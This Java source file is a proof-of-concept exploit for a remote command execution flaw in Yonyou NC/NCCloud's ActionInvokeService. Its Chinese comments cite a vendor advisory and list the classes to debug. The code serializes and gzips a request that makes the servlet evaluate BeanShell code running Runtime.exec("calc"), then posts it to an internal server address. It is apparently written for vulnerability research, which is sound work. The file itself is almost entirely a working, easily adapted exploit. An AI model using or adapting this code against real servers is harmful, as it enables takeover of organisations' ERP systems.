package cve.nc;

import bsh.BshClassManager;
import bsh.NameSpace;
import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.http.Response;

import org.apache.http.client.methods.HttpPost;

import java.io.*;

import java.util.zip.GZIPOutputStream;

/**
 * 漏洞：
 * 用友 NC/NCCloud ActionInvokeService命令执行漏洞
 * https://security.yonyou.com/#/noticeInfo?id=349
 *
 * 关键调试类：
 * com.ufida.zior.console.ActionHandlerServlet
 * com.ufida.zior.console.ActionInvokeService
 * bsh.Interpreter#eval
 */
public class ActionInvokeService_RCE {

    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201/servlet/~aert/com.ufida.zior.console.ActionHandlerServlet";
        String msg = "com.ufida.zior.console.ActionInvokeService";
        String methodName = "exec";
        Object[] paramter = {"bsh.Interpreter", "eval", new Object[]{"Runtime.getRuntime().exec(\"calc\")", new NameSpace((BshClassManager) null, "Called from compiled Java code.")}};
        String currentLanguage = "any";
        String logModule = "any";

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        GZIPOutputStream gos = new GZIPOutputStream(baos);
        ObjectOutputStream oos = new ObjectOutputStream(gos);
        oos.writeObject(msg);
        oos.writeObject(methodName);
        oos.writeObject(paramter);
        oos.writeObject(currentLanguage);
        oos.writeObject(logModule);

        oos.close();
        gos.close();
        baos.close();

        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);
        Response response = httpRequest.sendByteArrayPost(httpPost, baos.toByteArray());
        System.out.println(response.getStatusCode());

    }
}
